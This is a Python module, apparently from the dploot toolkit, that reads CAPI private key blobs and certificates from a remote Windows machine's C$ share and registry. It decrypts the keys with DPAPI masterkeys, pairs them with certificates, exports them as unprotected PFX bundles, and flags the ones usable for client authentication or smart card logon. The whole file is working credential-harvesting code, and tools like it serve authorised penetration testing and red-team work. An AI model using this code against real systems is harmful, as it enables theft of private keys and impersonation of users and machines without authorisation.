import hashlib
import logging
import ntpath
import os
from typing import Dict, List, Tuple, Callable
from dataclasses import dataclass

from Cryptodome.PublicKey import RSA
from cryptography import x509
from cryptography.hazmat._oid import ExtensionOID
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
from cryptography.hazmat.primitives.serialization import (
    Encoding,
    NoEncryption,
    pkcs12,
    PublicFormat,
    load_der_private_key,
)

from pyasn1.codec.der import decoder
from pyasn1.type.char import UTF8String

from dploot.triage import Triage
from dploot.lib.crypto import CERTBLOB
from dploot.lib.dpapi import decrypt_privatekey, find_masterkey_for_privatekey_blob
from dploot.lib.network import DPLootConnection
from dploot.lib.target import Target
from dploot.lib.utils import is_certificate_guid
from dploot.triage.masterkeys import Masterkey

PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")


@dataclass
class Certificate:
    winuser: str
    cert: x509.Certificate
    pkey: PrivateKeyTypes
    pfx: bytes
    username: str
    filename: str
    clientauth: bool

    def dump(self) -> None:
        print("Issuer:\t\t\t%s" % str(self.cert.issuer.rfc4514_string()))
        print("Subject:\t\t%s" % str(self.cert.subject.rfc4514_string()))
        print("Valid Date (UTC):\t%s" % self.cert.not_valid_before_utc)
        print("Expiry Date (UTC):\t%s" % self.cert.not_valid_after_utc)
        print("Extended Key Usage:")
        try:
            for i in self.cert.extensions.get_extension_for_oid(
                oid=ExtensionOID.EXTENDED_KEY_USAGE
            ).value:
                print(f"\t{i._name} ({i.dotted_string})")
        except x509.ExtensionNotFound:
            pass
        except (x509.DuplicateExtension, x509.UnsupportedGeneralNameType) as e:
            logging.debug(e)

        if self.clientauth:
            print("\t[!] Certificate is used for client auth!")

        print()
        print(self.cert.public_bytes(Encoding.PEM).decode("utf-8"))
        print()


class CertificatesTriage(Triage):
    system_capi_keys_generic_path = [
        "ProgramData\\Microsoft\\Crypto\\RSA",
        "Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA",
    ]
    user_capi_keys_generic_path = [
        "Users\\%s\\AppData\\Roaming\\Microsoft\\Crypto\\RSA",
    ]
    user_mycertificates_generic_path = [
        "Users\\%s\\AppData\\Roaming\\Microsoft\\SystemCertificates\\My\\Certificates"
    ]
    share = "C$"

    def __init__(
        self,
        target: Target,
        conn: DPLootConnection,
        masterkeys: List[Masterkey],
        per_certificate_callback: Callable = None,
        false_positive: List[str] | None = None,
    ) -> None:
        super().__init__(
            target, 
            conn, 
            masterkeys=masterkeys, 
            per_loot_callback=per_certificate_callback, 
            false_positive=false_positive
        )

    def triage_system_certificates(self) -> List[Certificate]:
        certificates = []
        pkeys = self.loot_privatekeys()
        logging.debug(f"Got {len(pkeys)} private key(s).")
        # stop here if no private key has been found.
        if not pkeys:
            return certificates
        certs = self.loot_system_certificates()
        logging.debug(f"Got {len(certs)} certificate(s).")
        if len(pkeys) > 0 and len(certs) > 0:
            certificates = self.correlate_certificates_and_privatekeys(
                certs=certs, private_keys=pkeys, winuser="SYSTEM"
            )
        return certificates

    def loot_system_certificates(self) -> Dict[str, x509.Certificate]:
        my_certificates_key = [
            "SOFTWARE\\Microsoft\\SystemCertificates\\MY\\Certificates"
        ]
        certificates = {}
        for my_key in my_certificates_key:
            for certificate_key in self.conn.reg_enum_key("HKLM",my_key):
                certblob_bytes = self.conn.reg_get_key_value("HKLM",f"{my_key}\\{certificate_key}","Blob")
                logging.debug(
                    f"Found Certificates Blob: \\\\{self.target.address}\\{ntpath.join(my_key, certificate_key)}"
                )
                certblob = CERTBLOB(certblob_bytes)
                if certblob.der is not None:
                    try:
                        cert = self.der_to_cert(certblob.der)
                        certificates[certificate_key] = cert
                    except Exception as e:
                        logging.debug(f'Excetpion while converting certificate: {repr(e)}')
        return certificates

    def triage_certificates(self) -> List[Certificate]:
        certificates = []
        for user in self.users:
            try:
                certificates += self.triage_certificates_for_user(user=user)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    logging.debug(str(e))
        return certificates

    def triage_certificates_for_user(self, user: str) -> List[Certificate]:
        certificates = []
        pkeys = self.loot_privatekeys(
            privatekeys_paths=[elem % user for elem in self.user_capi_keys_generic_path]
        )
        certs = self.loot_certificates(
            certificates_paths=[
                elem % user for elem in self.user_mycertificates_generic_path
            ]
        )
        if len(pkeys) > 0 and len(certs) > 0:
            certificates = self.correlate_certificates_and_privatekeys(
                certs=certs, private_keys=pkeys, winuser=user
            )
        return certificates

    def loot_privatekeys(
        self, privatekeys_paths: List[str] = system_capi_keys_generic_path
    ) -> Dict[str, Tuple[str, RSA.RsaKey]]:
        pkeys = {}
        pkeys_dirs = self.conn.list_dirs(self.share, privatekeys_paths)
        for pkeys_path, pkeys_dir in pkeys_dirs.items():
            if pkeys_dir is not None:
                for d in pkeys_dir:
                    if (
                        d not in self.false_positive
                        and d.is_directory() > 0
                        and (
                            d.get_longname()[:2].upper() == "S-"
                            or d.get_longname().upper() == "MachineKeys".upper()
                        )
                    ):
                        sid = d.get_longname()
                        pkeys_sid_path = ntpath.join(pkeys_path, sid)
                        pkeys_sid_dir = self.conn.list_dir(
                            path=pkeys_sid_path, share=self.share
                        )
                        for file in pkeys_sid_dir:
                            if file.is_directory() == 0 and is_certificate_guid(
                                file.get_longname()
                            ):
                                pkey_guid = file.get_longname()
                                filepath = ntpath.join(pkeys_sid_path, pkey_guid)
                                logging.debug(
                                    f"Found PrivateKey Blob: \\\\{self.target.address}\\{self.share}\\{filepath}"
                                )
                                pkey_bytes = self.conn.read_file(share=self.share, path=filepath, looted_files=self.looted_files)
                                if (
                                    pkey_bytes is not None
                                    and self.masterkeys is not None
                                ):
                                    try:
                                        masterkey = find_masterkey_for_privatekey_blob(
                                            pkey_bytes, masterkeys=self.masterkeys
                                        )
                                        if masterkey is not None:
                                            pkey = decrypt_privatekey(
                                                privatekey_bytes=pkey_bytes,
                                                masterkey=masterkey,
                                            )
                                            pkeys[
                                                hashlib.md5(
                                                    pkey.public_key().export_key("DER")
                                                ).hexdigest()
                                            ] = (pkey_guid, pkey)
                                    except Exception as e:
                                        logging.debug(
                                            f"Exception encountered in {__name__}: {e}."
                                        )
        return pkeys

    def loot_certificates(
        self, certificates_paths: List[str]
    ) -> Dict[str, x509.Certificate]:
        certificates = {}
        certificates_dir = self.conn.list_dirs(self.share, certificates_paths)
        for cert_dir_path, cert_dir in certificates_dir.items():
            if cert_dir is not None:
                for cert in cert_dir:
                    if cert not in self.false_positive and cert.is_directory() == 0:
                        try:
                            certname = cert.get_longname()
                            certpath = ntpath.join(cert_dir_path, certname)
                            logging.debug(
                                f"Found Certificates Blob: \\\\{self.target.address}\\{self.share}\\{certpath}"
                            )
                            certbytes = self.conn.read_file(share=self.share, path=certpath, looted_files=self.looted_files)
                            certblob = CERTBLOB(certbytes)
                            if certblob.der is not None:
                                cert = self.der_to_cert(certblob.der)
                                certificates[certname] = cert
                                logging.debug(f"added cert {cert.subject}")
                        except Exception as e:
                            logging.debug(repr(e))
        return certificates

    def correlate_certificates_and_privatekeys(
        self,
        certs: Dict[str, x509.Certificate],
        private_keys: Dict[str, Tuple[str, RSA.RsaKey]],
        winuser: str,
    ) -> List[Certificate]:
        certificates = []
        for name, cert in certs.items():
            if (
                hashlib.md5(
                    cert.public_key().public_bytes(
                        Encoding.DER, PublicFormat.SubjectPublicKeyInfo
                    )
                ).hexdigest()
                in private_keys
            ):
                # Matching public and private key
                pkey = private_keys[
                    hashlib.md5(
                        cert.public_key().public_bytes(
                            Encoding.DER, PublicFormat.SubjectPublicKeyInfo
                        )
                    ).hexdigest()
                ]
                logging.debug(
                    f"Found match between {name} certificate and {pkey[0]} private key !"
                )
                key = load_der_private_key(pkey[1].export_key("DER"), password=None)
                pfx = self.create_pfx(key=key, cert=cert)
                # TODO CAN BE NULL self.get_id_from_certificate(certificate=cert)[1]
                username = self.get_id_from_certificate(certificate=cert)[1].replace(
                    "@", "_"
                )
                clientauth = False
                try:
                    ext=cert.extensions.get_extension_for_oid(oid=ExtensionOID.EXTENDED_KEY_USAGE)
                    for i in ext.value:
                        if i.dotted_string in [
                            "1.3.6.1.5.5.7.3.2",  # Client Authentication
                            "1.3.6.1.5.2.3.4",  # PKINIT Client Authentication
                            "1.3.6.1.4.1.311.20.2.2",  # Smart Card Logon
                            "2.5.29.37.0",  # Any Purpose
                        ]:
                            clientauth = True
                            break
                except x509.ExtensionNotFound:
                    logging.debug('no extended key usage in certificate')
                except (x509.DuplicateExtension, x509.UnsupportedGeneralNameType) as e:
                    logging.debug(e)


                cert_object = Certificate(
                    winuser=winuser,
                    cert=cert,
                    pkey=key,
                    pfx=pfx,
                    username=username,
                    filename=name,
                    clientauth=clientauth,
                )
                certificates.append(cert_object)
                if self.per_loot_callback is not None:
                    self.per_loot_callback(cert_object)
        return certificates

    def der_to_cert(self, certificate: bytes) -> x509.Certificate:
        return x509.load_der_x509_certificate(certificate)

    def create_pfx(self, key: rsa.RSAPrivateKey, cert: x509.Certificate) -> bytes:
        return pkcs12.serialize_key_and_certificates(
            name=b"",
            key=key,
            cert=cert,
            cas=None,
            encryption_algorithm=NoEncryption(),
        )

    def get_id_from_certificate(self, certificate: x509.Certificate) -> Tuple[str, str]:
        try:
            san = certificate.extensions.get_extension_for_oid(
                ExtensionOID.SUBJECT_ALTERNATIVE_NAME
            )

            for name in san.value.get_values_for_type(x509.OtherName):
                if name.type_id == PRINCIPAL_NAME:
                    return (
                        "UPN",
                        decoder.decode(name.value, asn1Spec=UTF8String)[0].decode(),
                    )

            for name in san.value.get_values_for_type(x509.DNSName):
                return "DNS Host Name", name
        except Exception:
            pass

        return "", "SAN not found"
